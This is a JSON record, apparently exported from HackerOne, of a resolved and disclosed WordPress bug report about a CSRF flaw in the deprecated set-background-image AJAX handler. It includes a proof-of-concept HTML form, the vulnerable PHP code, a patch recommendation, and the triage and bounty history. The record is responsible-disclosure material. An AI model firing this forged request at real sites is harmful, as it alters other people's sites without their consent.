@@ -1,0 +1,337 @@
+{
+    "id": 881855,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODE4NTU=",
+    "url": "https://hackerone.com/reports/881855",
+    "title": "Arbitrary change of blog's background image via CSRF",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2020-05-24T17:13:23.625Z",
+    "submitted_at": "2020-05-24T17:13:23.625Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "erwan_lr",
+        "url": "/erwan_lr",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/kL9zJEZXY89ocnwagnb5yBfK/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 55,
+        "url": "https://hackerone.com/wordpress",
+        "handle": "wordpress",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "WordPress",
+            "twitter_handle": "wordpress",
+            "website": "https://wordpress.org/",
+            "about": "Beautiful sites of any kind."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2020-12-14T10:19:54.363Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-12-14T10:09:12.763Z",
+    "team_member_agreed_on_going_public_at": "2020-12-14T10:19:54.221Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Description:\n\nDespite being deprecated since v3.5.0, the `wp_set_background_image` method (defined in wp-admin/includes/class-custom-background.php), registered as an authenticated AJAX call (`wp_ajax_set-background-image`), is still active.\n\nGiven that the method is lacking CSRF checks, an attacker could change the background image of the blog to an arbitrary one from the media library via a CSRF attack on a logged in user with the `edit_theme_options` capability (by default administrators).\n\n## Steps To Reproduce:\n\nSave the code below in an HTML file, replace the `[WP]` by the correct domain, and change the `attachement_id` to an existing attachment id. The `size` parameter can also be changed to `thumbnail`, `medium`, `large` or `full`.\n\n```html\n<html>\n  <body>\n    <form action=\"https://[WP]/wp-admin/admin-ajax.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"attachment_id\" value=\"5\" />\n      <input type=\"hidden\" name=\"action\" value=\"set-background-image\" />\n      <input type=\"hidden\" name=\"size\" value=\"thumbnail\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\nThen log on to the blog as an administrator, open the file (with the same web browser used to login) and click the `Submit request` button. Then go the homepage of the blog and notice that the background image has been changed.\n\n## Recommendations\n\nGiven that the method has been deprecated and replaced with the `ajax_background_add` one which has the correct checks (both CSRF and authorisation), it would be recommended to remove the `wp_set_background_image` function all together, or at least not register it in the `wp_ajax_` hook.\n\n## Affected Code\n\nIn wp-admin/includes/class-custom-background.php\n\n```php\n// Unused since 3.5.0.\nadd_action( 'wp_ajax_set-background-image', array( $this, 'wp_set_background_image' ) );\n\n/**\n * @since 3.4.0\n * @deprecated 3.5.0\n */\npublic function wp_set_background_image() {\n\tif ( ! current_user_can( 'edit_theme_options' ) || ! isset( $_POST['attachment_id'] ) ) {\n\t\texit;\n\t}\n\n\t$attachment_id = absint( $_POST['attachment_id'] );\n\n\t$sizes = array_keys(\n\t\t/** This filter is documented in wp-admin/includes/media.php */\n\t\tapply_filters(\n\t\t\t'image_size_names_choose',\n\t\t\tarray(\n\t\t\t\t'thumbnail' => __( 'Thumbnail' ),\n\t\t\t\t'medium'    => __( 'Medium' ),\n\t\t\t\t'large'     => __( 'Large' ),\n\t\t\t\t'full'      => __( 'Full Size' ),\n\t\t\t)\n\t\t)\n\t);\n\n\t$size = 'thumbnail';\n\tif ( in_array( $_POST['size'], $sizes ) ) {\n\t\t$size = esc_attr( $_POST['size'] );\n\t}\n\n\tupdate_post_meta( $attachment_id, '_wp_attachment_is_custom_background', get_option( 'stylesheet' ) );\n\n\t$url       = wp_get_attachment_image_src( $attachment_id, $size );\n\t$thumbnail = wp_get_attachment_image_src( $attachment_id, 'thumbnail' );\n\tset_theme_mod( 'background_image', esc_url_raw( $url[0] ) );\n\tset_theme_mod( 'background_image_thumb', esc_url_raw( $thumbnail[0] ) );\n\texit;\n}\n```\n\n## Impact\n\nAn attacker could make a logged in administrator change the background image of the blog to one of the image available in the media library.\n\nDepending on the images available, the blog may become unreadable as the image repeats itself, potentially masking the text.",
+    "weakness": {
+        "id": 45,
+        "name": "Cross-Site Request Forgery (CSRF)"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 841212,
+            "file_name": "Screenshot_2020-05-24_at_18.21.57.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qX5vT9rUDVeQfdQtKfJkmYLE?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-05-24_at_18.21.57.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-05-24_at_18.21.57.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T071534Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=601c3ac74419c9316d5219fd2502c68013504e057a6c38e9ff9e700577152783",
+            "file_size": 1107005,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2021-01-13T10:09:12.863Z",
+    "allow_singular_disclosure_after": -82760782.13059093,
+    "singular_disclosure_allowed": true,
+    "vote_count": 19,
+    "voters": [
+        "bibekshah",
+        "ali",
+        "mattberg",
+        "erwan_lr",
+        "akashhamal0x01",
+        "demonia",
+        "nikhilaadhi",
+        "ro00t",
+        "temporary_nickname",
+        "kraed0",
+        "and 9 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "score": 6.4,
+        "author_type": "User",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "low",
+            "privileges_required": "none",
+            "user_interaction": "required",
+            "scope": "unchanged",
+            "confidentiality": "none",
+            "integrity": "low",
+            "availability": "low"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 2750,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "WordPress Core",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 8093456,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thank you for the report,  @erwan_lr! A very clear one too.\n\nI'm able to reproduce it so marking it as triaged. We'll be in touch once we start working on a patch for this, right now we don't have a timeline for that as we have a backlog of issues but I'll try get the bounty released for this so you don't have to wait on a fix.\n\nCheers",
+            "automated_response": false,
+            "created_at": "2020-05-25T03:34:11.752Z",
+            "updated_at": "2020-05-25T03:34:11.752Z",
+            "actor": {
+                "username": "ehtis",
+                "cleared": false,
+                "verified": false,
+                "url": "/ehtis",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 8093457,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-05-25T03:34:24.949Z",
+            "updated_at": "2020-05-25T03:34:24.949Z",
+            "actor": {
+                "username": "ehtis",
+                "cleared": false,
+                "verified": false,
+                "url": "/ehtis",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 8147811,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Hi @erwan_lr,\n\nWe're awarding a bounty for this report, however please note that this issue is still being triaged and that details of the issue should not be made public in any way. Public disclosure will be available as usual (if you desire) once the issue has been fully resolved.\n\nThanks once again for the responsible disclosure.",
+            "automated_response": false,
+            "created_at": "2020-05-29T16:46:24.781Z",
+            "updated_at": "2020-05-29T16:46:24.781Z",
+            "actor": {
+                "url": "/wordpress",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "profile": {
+                    "name": "WordPress"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "wordpress",
+            "collaborator": {
+                "username": "erwan_lr",
+                "url": "/erwan_lr"
+            }
+        },
+        {
+            "id": 8147976,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks!",
+            "automated_response": false,
+            "created_at": "2020-05-29T17:07:37.587Z",
+            "updated_at": "2020-05-29T17:07:37.587Z",
+            "actor": {
+                "username": "erwan_lr",
+                "cleared": false,
+                "verified": false,
+                "url": "/erwan_lr",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kL9zJEZXY89ocnwagnb5yBfK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 9716486,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Hi @erwan_lr,\n\nWanted to write to let you know that this has been patched in the most recent version of WordPress. Thanks for your help in contributing to WordPress!\n\nhttps://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/\n\nCheers,\n\n@whyisjake\n",
+            "automated_response": false,
+            "created_at": "2020-11-03T18:09:49.380Z",
+            "updated_at": "2020-11-03T18:09:49.380Z",
+            "actor": {
+                "username": "whyisjake",
+                "cleared": false,
+                "verified": false,
+                "url": "/whyisjake",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/499/942/de8d53f71535e9531105209e14875727a9e88cfe_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "erwan_lr",
+                "url": "/erwan_lr"
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 10094750,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-12-14T10:09:12.807Z",
+            "updated_at": "2020-12-14T10:09:12.807Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "erwan_lr",
+                "cleared": false,
+                "verified": false,
+                "url": "/erwan_lr",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/kL9zJEZXY89ocnwagnb5yBfK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 10094842,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Disclosing. 👍",
+            "automated_response": false,
+            "created_at": "2020-12-14T10:19:54.240Z",
+            "updated_at": "2020-12-14T10:19:54.240Z",
+            "actor": {
+                "username": "ehtis",
+                "cleared": false,
+                "verified": false,
+                "url": "/ehtis",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        },
+        {
+            "id": 10094843,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-12-14T10:19:54.387Z",
+            "updated_at": "2020-12-14T10:19:54.387Z",
+            "actor": {
+                "username": "ehtis",
+                "cleared": false,
+                "verified": false,
+                "url": "/ehtis",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "wordpress"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
